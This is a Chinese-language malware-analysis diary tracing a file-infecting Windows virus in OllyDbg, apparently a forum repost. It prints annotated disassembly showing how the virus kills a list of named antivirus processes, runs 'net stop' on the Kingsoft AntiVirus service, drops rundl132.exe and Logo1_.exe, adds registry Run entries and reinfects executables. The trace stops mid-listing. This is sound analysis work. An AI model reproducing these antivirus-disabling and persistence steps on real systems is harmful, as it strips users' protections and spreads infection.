

# 病毒分析日记(一)

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-12.htm`](https://www.pediy.com/kssd/pediy09/pediy09-12.htm)

> 刚重装系统之后，玩了一会泡泡堂，上了一会 QQ 之后病毒又出现了！刚装完的系统又有病毒，难道系统碟带毒的？今天想用 LorDPe 查看某个  
>   
> 程序的区段，刚一运行 LorDPe 机子就突然卡住了，任务管理器出现了 N 多新进程。。。事有可疑，接着就发现 LorDPe 程序的图标不见了，难道被  
>   
> 感染了？后来发现 D：E：F：下的所有 EXE 程序的图标几乎都不见了。。。。系统盘就不看了，刚装完的呢！  
> 下面这些是我列出来的，把他们都列到黑名单！同时他们都出现在注册表的启动项目当中。  
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
> c:\\windows\\uninst\\rundl132.exe  
> C:\\Program Files\\Microsoft\\svhost32.exe  
> C:\\Documents and Settings\\huyuytyt\\Local Settings\\Temp\\wlzs.exe  
> C:\\Documents and Settings\\huyuytyt\\Local Settings\\Temp\\mhs2.exe  
> c:\\windows\\SMSS.EXE  
> c:\\windows\\LOGO1\_.EXE  
> c:\\windows\\SYSTEM32\\iexp1ore.exe  
> c:\\windows\\SYSTEM32\\expiorer.exe  
>   
> HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows  
> load=???  
> ?  
> 这里也好可疑！！！！！！！！！  
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
>   
> 直接到看雪下 LorDPe，随便找了几个程序查看区段。。  
> \============================================================================================  
> ollydbg,ollyice,loaddll 的以及很多的 exe 都是这样:  
> 名称    VOFFSET    VSIZE    ROFFSET    RSIZE    标志  
> cc870    00001000  0002c000   00000200  00000000  E0000060  
> cc871    00002d00        0000e000  00000200  0000e000  E0000060  
> cc872    0003b000  00001034  0000e200  00000301  E0000060  
> 入口点统一是：0002F86F  
> \=============================================================================================  
> 怎么分析呢？我还是直接到看雪下一个 ollydbg 来跑一下，因为我不知道怎么分离可疑的区段以及还原代码。。那目标就是我自己写的 seh.exe(  
>   
> 被感染了),因为这个程序的代码还在。。。我知道自己写了什么代码在里面！！  
> 跟了一遍代码，结果什么都跟不到。。。加密了？？？查看都有什么函数吧！！！  
> 名称位于 seh  
> 地址       区段       类型    (  名称                                    注释  
> 0042D084   cc871      输入    (    KERNEL32.CloseHandle  
> 0042D07C   cc871      输入    (    KERNEL32.CreateFileA  
> 0042D088   cc871      输入    (    KERNEL32.ExitProcess  
> 0042D068   cc871      输入    (    KERNEL32.GetProcAddress  
> 0042D078   cc871      输入    (    KERNEL32.GetTempPathA  
> 0042D064   cc871      输入    (    KERNEL32.LoadLibraryA  
> 0042D070   cc871      输入    (    KERNEL32.VirtualAlloc  
> 0042D074   cc871      输入    (    KERNEL32.VirtualFree  
> 0042D06C   cc871      输入    (    KERNEL32.VirtualProtect  
> 0042D080   cc871      输入    (    KERNEL32.WriteFile  
> 0042F86F   cc871      输出         <模块入口点>  
>     还好不是很多，我选择选断 bp CreateFileA，发现一个很有趣的现象，OD 左下脚提示读取\[7\*\*\*\*\*\*\*\],N 多的 7\*\*\*\*\*\*\*快速飞过之后终于停  
>   
> 下来了。。  
> 0012FE24   00404AD7  /CALL 到 CreateFileA  
> 0012FE28   009A14C8  |FileName = "C:\\WINDOWS\\system32\\\\drivers\\etc\\hosts"  
> 0012FE2C   C0000000  |Access = GENERIC\_READ|GENERIC\_WRITE  
> 0012FE30   00000000  |ShareMode = 0  
> 0012FE34   00000000  |pSecurity = NULL  
> 0012FE38   00000003  |Mode = OPEN\_EXISTING  
> 0012FE3C   00000080  |Attributes = NORMAL  
> 0012FE40   00000000  \\hTemplateFile = NULL  
> 之后一路狂按 F8 来到这里，之前的好象都是对 hosts 这个文件的操作。。。。。。  
> 00408C??    55              push    ebp  
> 00408CBD    8BEC            mov     ebp, esp  
> 00408CBF    81C4 A0FEFFFF   add     esp, -160  
> ####略########  
> 00408D55    E8 2ABDFFFF     call    00404A84                          //跟进  
> {  
>   00404A84    53              push    ebx  
>   ####略########  
>   00404AD2    E8 85F7FFFF     call    0040425C                         ; jmp 到 kernel32.CreateFileA  
>   00404AD7    5F              pop     edi  
>   00404AD8    5E              pop     esi  
>   00404AD9    5B              pop     ebx  
>   00404ADA    C3              retn  
>   
>   堆栈提示：  
>   0012FE04   009A13F0  |FileName = "C:\\Documents and Settings\\huyuytyt\\",D7,"烂孳",B2,"",A1,"",B6,"拒 seh.exe"  
>   0012FE08   80000000  |Access = GENERIC\_READ  
>   0012FE0C   00000003  |ShareMode = FILE\_SHARE\_READ|FILE\_SHARE\_WRITE  
>   0012FE10   00000000  |pSecurity = NULL  
>   0012FE14   00000003  |Mode = OPEN\_EXISTING  
>   0012FE18   00000080  |Attributes = NORMAL  
>   0012FE1C   00000000  \\hTemplateFile = NULL  
> }  
> //打开自身文件  
> 00408D5A    8BF0            mov     esi, eax  
> 00408D5C    83FE FF         cmp     esi, -1                            //判断是不是打开失败了  
> 00408D5F    0F84 94000000   je      00408DF9  
> 00408D65    6A 00           push    0  
> 00408D67    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
> 00408D6A    50              push    eax  
> 00408D6B    68 00010000     push    100  
> 00408D70    8D85 DCFEFFFF   lea     eax, dword ptr \[ebp-124\]  
> 00408D76    50              push    eax  
> 00408D77    56              push    esi  
> 00408D78    E8 47B6FFFF     call    004043C4                         ; jmp 到 kernel32.ReadFile  
> 看堆栈：  
> 0012FE1C   00000060  |hFile = 00000060 (window)  
> 0012FE20   0012FE84  |Buffer = 0012FE84  
> 0012FE24   00000100  |BytesToRead = 100 (256.)  
> 0012FE28   0012FF98  |pBytesRead = 0012FF98  
> 0012FE2C   00000000  \\pOverlapped = NULL  
> //读取 256 字节。。。  
>   
> 00408D7D    85C0            test    eax, eax                         //读取失败？  
> 00408D7F    74 72           je      short 00408DF3                     
> 00408D81    817D F0 0001000>cmp     dword ptr \[ebp-10\], 100          //不是 100h 字节？  
> 00408D88    75 69           jnz     short 00408DF3  
> 00408D8A    8D85 0CFFFFFF   lea     eax, dword ptr \[ebp-F4\]         //\[ebp-F4\] =E501  
> 00408D90    8B00            mov     eax, dword ptr \[eax\]  
> 00408D92    A3 A0294100     mov     dword ptr \[4129A0\], eax  
> 00408D97    68 00000001     push    1000000                          //1000000 (16777216.)  
> 00408D9C    6A 00           push    0                                //GMEM\_FIXED  
> 00408D9E    E8 C9B5FFFF     call    0040436C                         ; jmp 到 kernel32.GlobalAlloc  
> //申请 1000000 大小的固定内存  
> 00408DA3    A3 90294100     mov     dword ptr \[412990\], eax  
> 00408DA8    813D A0294100 0>cmp     dword ptr \[4129A0\], 1000000     //eax（E501）与 1000000h 比较，  
> 00408DB2    7F 3F           jg      short 00408DF3  
> 00408DB4    A1 A0294100     mov     eax, dword ptr \[4129A0\]  
> 00408DB9    E8 CE96FFFF     call    0040248C  
> 00408DBE    A3 94294100     mov     dword ptr \[412994\], eax  
> 00408DC3    33C9            xor     ecx, ecx  
> 00408DC5    33D2            xor     edx, edx  
> 00408DC7    8BC6            mov     eax, esi                        eax=esi=60h  
> 00408DC9    E8 FABAFFFF     call    004048C8                        //跟进  
> {  
>   004048C8    51              push    ecx                              //0  
>   004048C9    6A 00           push    0                               //0  
>   004048CB    52              push    edx                             //0  
>   004048CC    50              push    eax                             //hFile=60h  
>   004048CD    E8 12FBFFFF     call    004043E4                         ; jmp 到 kernel32.SetFilePointer  
>   004048D2    C3              retn                                   //将文件指针移动到文件开始处，返回  
> }  
> 00408DCE    6A 00           push    0                                //pOverlapped = NULL  
> 00408DD0    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
> 00408DD3    50              push    eax                              //pBytesRead = 0012FF98  
> 00408DD4    A1 A0294100     mov     eax, dword ptr \[4129A0\]  
> 00408DD9    50              push    eax                              //BytesToRead = E501 (58625.)  
> 00408DDA    A1 94294100     mov     eax, dword ptr \[412994\]  
> 00408DDF    50              push    eax                              //Buffer = 009A142C  
> 00408DE0    56              push    esi                              //hFile = 00000060 (window)  
> 00408DE1    E8 DEB5FFFF     call    004043C4                         ; jmp 到 kernel32.ReadFile  
> //读取 E501 字节。。。  
> 00408DE6    8B45 F0         mov     eax, dword ptr \[ebp-10\]          //E501 到 eax  
> 00408DE9    3B05 A0294100   cmp     eax, dword ptr \[4129A0\]          //比较是不是读取了 E501 字节    
> 00408DEF    75 02           jnz     short 00408DF3  
> 00408DF1    B3 01           mov     bl, 1  
> 00408DF3    56              push    esi  
> 00408DF4    E8 43B4FFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
> 00408DF9    84DB            test    bl, bl  
> 00408DFB    0F84 5D030000   je      0040915E  
> 00408E01    E8 866E0000     call    0040FC8C                         //跟进  
> {  
>   0040FC8C    53              push    ebx  
>   0040FC8D    33DB            xor     ebx, ebx  
>   0040FC8F    68 F0FC4000     push    0040FCF0                         //MappingName = "渝磲痂矧逋逋逋"  
>   0040FC94    6A 00           push    0                                //InheritHandle = FALSE  
>   0040FC96    6A 06           push    6                                //Access = 6  
>   0040FC98    E8 1747FFFF     call    004043B4                         ; jmp 到 kernel32.OpenFileMappingA  
>   0040FC9D    A3 98294100     mov     dword ptr \[412998\], eax  
>   0040FCA2    833D 98294100 0>cmp     dword ptr \[412998\], 0  
>   0040FCA9    74 04           je      short 0040FCAF  
>   0040FCAB    B3 01           mov     bl, 1  
>   0040FCAD    EB 1C           jmp     short 0040FCCB  
>   0040FCAF    68 F0FC4000     push    0040FCF0                         //MapName = "渝磲痂矧逋逋逋"  
>   0040FCB4    68 54400000     push    4054                             //MaximumSizeLow = 4054  
>   0040FCB9    6A 00           push    0                                 //MaximumSizeHigh = 0  
>   0040FCBB    6A 04           push    4                                //Protection = PAGE\_READWRITE  
>   0040FCBD    6A 00           push    0                                //pSecurity = NULL  
>   0040FCBF    6A FF           push    -1                               //hFile = FFFFFFFF  
>   0040FCC1    E8 9E45FFFF     call    00404264                         ; jmp 到 kernel32.CreateFileMappingA  
>   0040FCC6    A3 98294100     mov     dword ptr \[412998\], eax  
>   0040FCCB    6A 00           push    0  
>   0040FCCD    6A 00           push    0  
>   0040FCCF    6A 00           push    0  
>   0040FCD1    6A 06           push    6  
>   0040FCD3    A1 98294100     mov     eax, dword ptr \[412998\]  
>   0040FCD8    50              push    eax  
>   0040FCD9    E8 C646FFFF     call    004043A4                         ; jmp 到 kernel32.MapViewOfFile  
>   0040FCDE    A3 9C294100     mov     dword ptr \[41299C\], eax  
>   0040FCE3    84DB            test    bl, bl  
>   0040FCE5    75 05           jnz     short 0040FCEC  
>   0040FCE7    E8 A8070000     call    00410494                         //这个 call 里面的赋值我还不是很明了       
>   0040FCEC    8BC3            mov     eax, ebx  
>   0040FCEE    5B              pop     ebx  
>   0040FCEF    C3              retn  
> }  
> 00408E06    8BD8            mov     ebx, eax  
> 00408E08    84DB            test    bl, bl  
> 00408E0A    74 64           je      short 00408E70                    //顺着 OD 跳走  
> 。。。。。。  
> 00408E70    8B07            mov     eax, dword ptr \[edi\]             //  
> 00408E72    C740 0C 0100000>mov     dword ptr \[eax+C\], 1  
> 00408E72    C740 0C 0100000>mov     dword ptr \[eax+C\], 1  
> 00408E79    E8 12FDFFFF     call    00408B90                        //跟进  
>   
> 00408B90    55              push    ebp  
> 00408B91    8BEC            mov     ebp, esp  
> 00408B93    33C9            xor     ecx, ecx  
> 00408B95    51              push    ecx  
> 00408B96    51              push    ecx  
> 00408B97    51              push    ecx  
> 00408B98    51              push    ecx  
> 00408B99    51              push    ecx  
> 00408B9A    33C0            xor     eax, eax  
> 00408B9C    55              push    ebp  
> 00408B9D    68 448C4000     push    00408C44  
> 00408BA2    64:FF30         push    dword ptr fs:\[eax\]  
> 00408BA5    64:8920         mov     dword ptr fs:\[eax\], esp  
> 00408BA8    E8 8BE6FFFF     call    00407238                     //跟进  
> 00408BAD    8D55 F8         lea     edx, dword ptr \[ebp-8\]  
>   
>   
>   
> 00407238    55              push    ebp  
> 00407239    8BEC            mov     ebp, esp  
> 0040723B    B9 05000000     mov     ecx, 5  
> 00407240    6A 00           push    0  
> 00407242    6A 00           push    0  
> 00407244    49              dec     ecx  
> 00407245  ^ 75 F9           jnz     short 00407240  
> 00407247    33C0            xor     eax, eax  
> 00407249    55              push    ebp  
> 0040724A    68 5A734000     push    0040735A  
> 0040724F    64:FF30         push    dword ptr fs:\[eax\]  
> 00407252    64:8920         mov     dword ptr fs:\[eax\], esp  
> 00407255    8D55 FC         lea     edx, dword ptr \[ebp-4\]  
> 00407258    B8 70734000     mov     eax, 00407370                    ; ASCII "裔鐾镱??"  
> 0040725D    E8 5EDAFFFF     call    00404CC0  
> 00407262    8B45 FC         mov     eax, dword ptr \[ebp-4\]           ; RavMon.exe  
> 00407265    E8 9EC2FFFF     call    00403508  
> 0040726A    50              push    eax  
> 0040726B    8D55 F8         lea     edx, dword ptr \[ebp-8\]  
> 0040726E    B8 84734000     mov     eax, 00407384                    ; ASCII "裔鐾镱渺狍?  
> 00407273    E8 48DAFFFF     call    00404CC0  
> 00407278    8B45 F8         mov     eax, dword ptr \[ebp-8\]           ; RavMonClass  
> 0040727B    E8 88C2FFFF     call    00403508  
> 00407280    50              push    eax  
> 00407281    E8 26D2FFFF     call    004044AC                         ; jmp 到 user32.FindWindowA  
> //FindWindowA(RavMonClass,RavMon.exe)  
> 00407286    6A 00           push    0  
> 00407288    6A 00           push    0  
> 0040728A    6A 10           push    10  
> 0040728C    50              push    eax  
> 0040728D    E8 62D2FFFF     call    004044F4                         ; jmp 到 user32.SendMessageA  
> //发送关闭消息  
> 00407292    8D55 F4         lea     edx, dword ptr \[ebp-C\]  
> 00407295    B8 98734000     mov     eax, 00407398                    ; ASCII "徘认釉?嘏"  
> 0040729A    E8 21DAFFFF     call    00404CC0  
> 0040729F    8B45 F4         mov     eax, dword ptr \[ebp-C\]           ; "EGHOST.EXE"  
> 004072A2    E8 B9020000     call    00407560  
> 004072A7    8D55 F0         lea     edx, dword ptr \[ebp-10\]  
> 004072AA    B8 AC734000     mov     eax, 004073AC                    ; ASCII "土商拖萎咆?  
> 004072AF    E8 0CDAFFFF     call    00404CC0  
> 004072B4    8B45 F0         mov     eax, dword ptr \[ebp-10\]          ; "MAILMON.EXE"  
> 004072B7    E8 A4020000     call    00407560  
> 004072BC    8D55 EC         lea     edx, dword ptr \[ebp-14\]  
> 004072BF    B8 C0734000     mov     eax, 004073C0  
> 004072C4    E8 F7D9FFFF     call    00404CC0  
> 004072C9    8B45 EC         mov     eax, dword ptr \[ebp-14\]          ; "KAVPFW.EXE"  
> 004072CC    E8 8F020000     call    00407560  
> 004072D1    8D55 E8         lea     edx, dword ptr \[ebp-18\]  
> 004072D4    B8 D4734000     mov     eax, 004073D4                    ; ASCII "尚烈拖耶咆?  
> 004072D9    E8 E2D9FFFF     call    00404CC0  
> 004072DE    8B45 E8         mov     eax, dword ptr \[ebp-18\]          ; "IPARMOR.EXE"  
> 004072E1    E8 7A020000     call    00407560  
> 004072E6    8D55 E4         lea     edx, dword ptr \[ebp-1C\]  
> 004072E9    B8 E8734000     mov     eax, 004073E8                    ; ASCII "裔鲰镱洚咆?  
> 004072EE    E8 CDD9FFFF     call    00404CC0  
> 004072F3    8B45 E4         mov     eax, dword ptr \[ebp-1C\]          ; "Ravmond.EXE"  
> 004072F6    E8 65020000     call    00407560  
> 004072FB    8D55 E0         lea     edx, dword ptr \[ebp-20\]  
> 004072FE    B8 FC734000     mov     eax, 004073FC                    ; ASCII "蝈珞鲢??"  
> 00407303    E8 B8D9FFFF     call    00404CC0  
> 00407308    8B45 E0         mov     eax, dword ptr \[ebp-20\]          ;  "regsvc.exe"  
> 0040730B    E8 50020000     call    00407560  
> 00407310    8D55 DC         lea     edx, dword ptr \[ebp-24\]  
> 00407313    B8 70734000     mov     eax, 00407370                    ; ASCII "裔鐾镱??"  
> 00407318    E8 A3D9FFFF     call    00404CC0  
> 0040731D    8B45 DC         mov     eax, dword ptr \[ebp-24\]          ; "RavMon.exe"  
> 00407320    E8 3B020000     call    00407560  
> 00407325    8D55 D8         lea     edx, dword ptr \[ebp-28\]  
> 00407328    B8 10744000     mov     eax, 00407410                    ; ASCII "磴箬殄熹??"  
> 0040732D    E8 8ED9FFFF     call    00404CC0  
> 00407332    8B45 D8         mov     eax, dword ptr \[ebp-28\]          ; "mcshield.exe"  
> 00407335    E8 26020000     call    00407560  
> 0040733A    E8 39FEFFFF     call    00407178  
> 0040733F    33C0            xor     eax, eax  
> 00407341    5A              pop     edx  
> 00407342    59              pop     ecx  
> 00407343    59              pop     ecx  
> 00407344    64:8910         mov     dword ptr fs:\[eax\], edx  
> 00407347    68 61734000     push    00407361  
> 0040734C    8D45 D8         lea     eax, dword ptr \[ebp-28\]  
> 0040734F    BA 0A000000     mov     edx, 0A  
> 00407354    E8 3FBEFFFF     call    00403198  
> 00407359    C3              retn  
> //call    00404CC0 这个是解密函数，负责将乱码解密  
> //call    00407560 这个函数是关闭指定进程的一段代码，先用 ProcessFirst,Processnext,CreateToolhelp32napshot 等进程快照函数列举有  
>   
> 没有以下进程：  
> 0012FDD8   009A0FD0  ASCII "mcshield.exe"  
> 0012FDDC   009A1084  ASCII "RavMon.exe"  
> 0012FDE0   009A1170  ASCII "regsvc.exe"  
> 0012FDE4   009A1290  ASCII "Ravmond.EXE"  
> 0012FDE8   009A01CC  ASCII "IPARMOR.EXE"  
> 0012FDEC   009A0364  ASCII "KAVPFW.EXE"  
> 0012FDF0   009A053C  ASCII "MAILMON.EXE"  
> 0012FDF4   009A09C0  ASCII "EGHOST.EXE"  
> 0012FDF8   009A0950  ASCII "RavMonClass"  
> 0012FDFC   009A08E4  ASCII "RavMon.exe"  
> 有就用 OpenProcess,TerminateProcess 函数关闭之。  
>   
> 00408BAD    8D55 F8         lea     edx, dword ptr \[ebp-8\]  
> 00408BB0    B8 588C4000     mov     eax, 00408C58                    ; ASCII "酥惋钬挟素?  
> 00408BB5    E8 06C1FFFF     call    00404CC0  
> 00408BBA    8B45 F8         mov     eax, dword ptr \[ebp-8\]           ;  "KVMonXP.KXP  
> 00408BBD    E8 9EE9FFFF     call    00407560  
> 00408BC2    8D55 F4         lea     edx, dword ptr \[ebp-C\]  
> 00408BC5    B8 6C8C4000     mov     eax, 00408C6C                    ; ASCII "艘彗砒??"  
> 00408BCA    E8 F1C0FFFF     call    00404CC0  
> 00408BCF    8B45 F4         mov     eax, dword ptr \[ebp-C\]           ; "KRegEx.exe"  
> 00408BD2    E8 89E9FFFF     call    00407560  
> 00408BD7    8D55 F0         lea     edx, dword ptr \[ebp-10\]  
> 00408BDA    B8 808C4000     mov     eax, 00408C80                    ; ASCII "酥匦?匦"  
> 00408BDF    E8 DCC0FFFF     call    00404CC0  
> 00408BE4    8B45 F0         mov     eax, dword ptr \[ebp-10\]          ; "KVXP.KXP"  
> 00408BE7    E8 74E9FFFF     call    00407560  
> 00408BEC    6A 00           push    0  
> 00408BEE    8D55 EC         lea     edx, dword ptr \[ebp-14\]  
> 00408BF1    B8 948C4000     mov     eax, 00408C94  
> 00408BF6    E8 C5C0FFFF     call    00404CC0  
> 00408BFB    8B45 EC         mov     eax, dword ptr \[ebp-14\]          ;  "net stop ""Kingsoft AntiVirus Service""  
> 00408BFE    E8 05A9FFFF     call    00403508  
> 00408C03    50              push    eax  
> 00408C04    E8 33B8FFFF     call    0040443C                         ; jmp 到 kernel32.WinExec  
> 00408C09    8D45 FC         lea     eax, dword ptr \[ebp-4\]  
> 00408C0C    50              push    eax  
> 00408C0D    6A 00           push    0  
> 00408C0F    6A 00           push    0  
> 00408C11    68 008B4000     push    00408B00                           
> 00408C16    6A 00           push    0  
> 00408C18    6A 00           push    0  
> 00408C1A    E8 55B6FFFF     call    00404274                         ; jmp 到 kernel32.CreateThread  
> //这里同上，并且执行了 WinExec("net stop ""Kingsoft AntiVirus Service"",SW\_HIDE)  
> //创建了一个线程  
>   
>   
> 0040856B    64:8920         mov     dword ptr fs:\[eax\], esp  
> 0040856E    8D45 F4         lea     eax, dword ptr \[ebp-C\]  
> 00408571    E8 2EF9FFFF     call    00407EA4                         ; 取系统目录  
> 00408576    8B55 F4         mov     edx, dword ptr \[ebp-C\]  
> 00408579    8D45 FC         lea     eax, dword ptr \[ebp-4\]  
> 0040857C    B9 6C864000     mov     ecx, 0040866C                    ; ASCII "uninstall\\"  
> 00408581    E8 CEADFFFF     call    00403354                         ; 连接  
> 00408586    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
> 00408589    E8 72C5FFFF     call    00404B00  
> 0040858E    84C0            test    al, al  
> 00408590    75 10           jnz     short 004085A2  
> 00408592    6A 00           push    0  
> 00408594    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
> 00408597    E8 6CAFFFFF     call    00403508  
> 0040859C    50              push    eax  
> 0040859D    E8 B2BCFFFF     call    00404254                         ; jmp 到 kernel32.CreateDirectoryA  
> 004085A2    8D55 F0         lea     edx, dword ptr \[ebp-10\]  
> 004085A5    B8 80864000     mov     eax, 00408680  
> 004085AA    E8 11C7FFFF     call    00404CC0  
> 004085AF    8B55 F0         mov     edx, dword ptr \[ebp-10\]          ; "rundl132.exe"  
> 004085B2    8D45 FC         lea     eax, dword ptr \[ebp-4\]  
> 004085B5    E8 56ADFFFF     call    00403310  
> 004085BA    8B45 FC         mov     eax, dword ptr \[ebp-4\]           ; C:\\WINDOWS\\uninstall\\rundl132.exe  
> 004085BD    E8 12C3FFFF     call    004048D4                         ; 进去就知道是 creaefilea  
> 004085C2    8BD8            mov     ebx, eax  
> 004085C4    83FB FF         cmp     ebx, -1                          ；创建失败？  
> 004085C7    74 1E           je      short 004085E7  
> 004085C9    6A 00           push    0  
> 004085CB    8D45 F8         lea     eax, dword ptr \[ebp-8\]  
> 004085CE    50              push    eax  
> 004085CF    A1 A0294100     mov     eax, dword ptr \[4129A0\]  
> 004085D4    50              push    eax  
> 004085D5    A1 94294100     mov     eax, dword ptr \[412994\]  
> 004085DA    50              push    eax  
> 004085DB    53              push    ebx  
> 004085DC    E8 63BEFFFF     call    00404444                         ; jmp 到 kernel32.WriteFile  
> 004085E1    53              push    ebx  
> 004085E2    E8 55BCFFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
> 004085E7    8B45 FC         mov     eax, dword ptr \[ebp-4\]           ; C:\\WINDOWS\\uninstall\\rundl132.exe  
> 004085EA    E8 85C4FFFF     call    00404A74  
> 004085EF    84C0            test    al, al  
> 004085F1    74 41           je      short 00408634  
> 004085F3    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
> 004085F6    E8 0DAFFFFF     call    00403508  
> 004085FB    50              push    eax  
> 004085FC    8D55 EC         lea     edx, dword ptr \[ebp-14\]  
> 004085FF    B8 98864000     mov     eax, 00408698                    ; ASCII "祜徜"  
> 00408604    E8 B7C6FFFF     call    00404CC0  
> 00408609    8B45 EC         mov     eax, dword ptr \[ebp-14\]          ; load  
> 0040860C    E8 F7AEFFFF     call    00403508  
> 00408611    50              push    eax  
> 00408612    8D55 E8         lea     edx, dword ptr \[ebp-18\]  
> 00408615    B8 A8864000     mov     eax, 004086A8  
> 0040861A    E8 A1C6FFFF     call    00404CC0  
> 0040861F    8B45 E8         mov     eax, dword ptr \[ebp-18\]          ;  "Software\\Microsoft\\Windows\\CurrentVersion\\Run")  
> 00408622    E8 E1AEFFFF     call    00403508                         ; 写注册表  
>   
> \===================================================================================================================  
> 总结一：到这里，我知道了程序读取前面的 E501 字节内容写入到 C:\\WINDOWS\\uninstall\\rundl132.exe 文件当中，并添加到注册表的启动项目当  
>   
> 中。  
>   
> HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows  
> load=???  
> ?  
> 这个应该也是对应 rundl132.exe 的  
> 同时程序结束掉常见的杀毒软件，关闭了 Kingsoft AntiVirus Service 这个服务。。  
> 创建的线程 00408B00，跟到那发现有 winmm.waveOutSetVolume 等函数 ，（我的ＭＰ３突然变成静音了，是不是这几个函数在作怪？呵呵．．）以及用 FindWindow 查找 avp.exe,用 SendMessage 关闭的代码。。。  
>   
>   
> 继续跟着哦 od 走，来到这里：  
>   
> 00407F2F    E8 50CBFFFF     call    00404A84                         ; 打开自身文件  
> 00407F34    8BF0            mov     esi, eax  
> 00407F36    83FE FF         cmp     esi, -1  
> 00407F39    0F84 E1030000   je      00408320                         ; 失败？  
> 00407F3F    6A 00           push    0  
> 00407F41    56              push    esi  
> 00407F42    E8 C5C3FFFF     call    0040430C                         ; jmp 到 kernel32.GetFileSize  
> 00407F47    3B05 A0294100   cmp     eax, dword ptr \[4129A0\]          ; 文件大小-E501  
> 00407F4D    0F9FC3          setg    bl  
> 00407F50    84DB            test    bl, bl  
> 00407F52    0F84 C2030000   je      0040831A  
> 00407F58    8D95 64FDFFFF   lea     edx, dword ptr \[ebp-29C\]  
> 00407F5E    B8 64834000     mov     eax, 00408364                    ; ASCII "??"  
> 00407F63    E8 58CDFFFF     call    00404CC0  
> 00407F68    8B85 64FDFFFF   mov     eax, dword ptr \[ebp-29C\]         ; ".EXE"  
> 00407F6E    50              push    eax  
> 00407F6F    8D95 60FDFFFF   lea     edx, dword ptr \[ebp-2A0\]  
> 00407F75    33C0            xor     eax, eax  
> 00407F77    E8 A0A7FFFF     call    0040271C  
> 00407F7C    8B95 60FDFFFF   mov     edx, dword ptr \[ebp-2A0\]  
> 00407F82    8D45 EC         lea     eax, dword ptr \[ebp-14\]  
> 00407F85    59              pop     ecx  
> 00407F86    E8 C9B3FFFF     call    00403354  
> 00407F8B    8B45 EC         mov     eax, dword ptr \[ebp-14\]  
> 00407F8E    E8 75B5FFFF     call    00403508  
> 00407F93    50              push    eax                              ; "C:\\Documents and  Settings\\huyuytyt\\",D7,"烂  
>   
> 孳",B2,"",A1,"",B6,"拒 MdnPacker.exe.exe"  
> 00407F94    E8 E3C2FFFF     call    0040427C                         ; jmp 到 kernel32.DeleteFileA  
> //先删掉。。要不下面的函数容易出错！  
> 00407F99    8B45 EC         mov     eax, dword ptr \[ebp-14\]  
> 00407F9C    E8 D3CAFFFF     call    00404A74  
> 00407FA1    84C0            test    al, al  
> 00407FA3    0F85 71030000   jnz     0040831A  
> 00407FA9    8B45 EC         mov     eax, dword ptr \[ebp-14\]  
> 00407FAC    E8 23C9FFFF     call    004048D4                           
> {  
>  。。。。。。  
>  004048D7    6A 00           push    0  
>  004048D9    68 80000000     push    80  
>  004048DE    6A 02           push    2  
>  004048E0    6A 00           push    0  
>  004048E2    6A 00           push    0  
>  004048E4    68 000000C0     push    C0000000  
>  004048E9    8BC3            mov     eax, ebx  
>  004048EB    E8 18ECFFFF     call    00403508  
>  004048F0    50              push    eax                             |FileName = "C:\\Documents and  Settings\\huyuytyt\\",D7,"  
>   
> 烂孳",B2,"",A1,"",B6,"拒 MdnPacker.exe.exe"  
>  004048F1    E8 66F9FFFF     call    0040425C                         ; jmp 到 kernel32.CreateFileA  
>  004048F6    5B              pop     ebx  
>  004048F7    C3              retn  
>   
> //创建了一个文件，只是比本身的多了一个.exe  
> }  
> 00407FB1    8BF8            mov     edi, eax  
> 00407FB3    83FF FF         cmp     edi, -1  
> 00407FB6    0F84 5E030000   je      0040831A  
> 00407FBC    8D45 CC         lea     eax, dword ptr \[ebp-34\]  
> 00407FBF    50              push    eax  
> 00407FC0    8D45 D4         lea     eax, dword ptr \[ebp-2C\]  
> 00407FC3    50              push    eax  
> 00407FC4    8D45 DC         lea     eax, dword ptr \[ebp-24\]  
> 00407FC7    50              push    eax  
> 00407FC8    56              push    esi  
> 00407FC9    E8 46C3FFFF     call    00404314                         ; jmp 到 kernel32.GetFileTime  
> 00407FCE    8D45 E4         lea     eax, dword ptr \[ebp-1C\]  
> 00407FD1    BA 74834000     mov     edx, 00408374  
> 00407FD6    E8 31B2FFFF     call    0040320C  
> 00407FDB    8D85 58FDFFFF   lea     eax, dword ptr \[ebp-2A8\]  
> 00407FE1    B9 84834000     mov     ecx, 00408384                    ; ASCII "边??"  
> 00407FE6    8B55 E4         mov     edx, dword ptr \[ebp-1C\]  
> 00407FE9    E8 66B3FFFF     call    00403354  
> 00407FEE    8B85 58FDFFFF   mov     eax, dword ptr \[ebp-2A8\]  
> 00407FF4    8D95 5CFDFFFF   lea     edx, dword ptr \[ebp-2A4\]  
> 00407FFA    E8 C1CCFFFF     call    00404CC0  
> 00407FFF    8B85 5CFDFFFF   mov     eax, dword ptr \[ebp-2A4\]         ; "Logo1\_.exe"  
> 00408005    50              push    eax  
> 00408006    8D85 54FDFFFF   lea     eax, dword ptr \[ebp-2AC\]  
> 0040800C    E8 93FEFFFF     call    00407EA4                         ; 取系统目录  
> 00408011    8B95 54FDFFFF   mov     edx, dword ptr \[ebp-2AC\]         ; 系统目录--EDX  
> 00408017    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
> 0040801A    59              pop     ecx  
> 0040801B    E8 34B3FFFF     call    00403354                         ; 连接  
> 00408020    8B45 F0         mov     eax, dword ptr \[ebp-10\]          ; "C:\\WINDOWS\\Logo1\_.exe"  
> 00408023    E8 ACC8FFFF     call    004048D4                         ；这个 call 是创建文件的一个函数，传进去的 EAX 指向文件名  
> 00408052    50              push    eax  
> 00408053    A1 90294100     mov     eax, dword ptr \[412990\]  
> 00408058    50              push    eax                              ；EAX=E501，读取 E501 字节  
> 00408059    56              push    esi                              ；hFile=64,可以看出是自身文件  
> 0040805A    E8 65C3FFFF     call    004043C4                         ; jmp 到 kernel32.ReadFile  
> 0040805F    837D F8 00      cmp     dword ptr \[ebp-8\], 0  
> 00408063    74 1D           je      short 00408082  
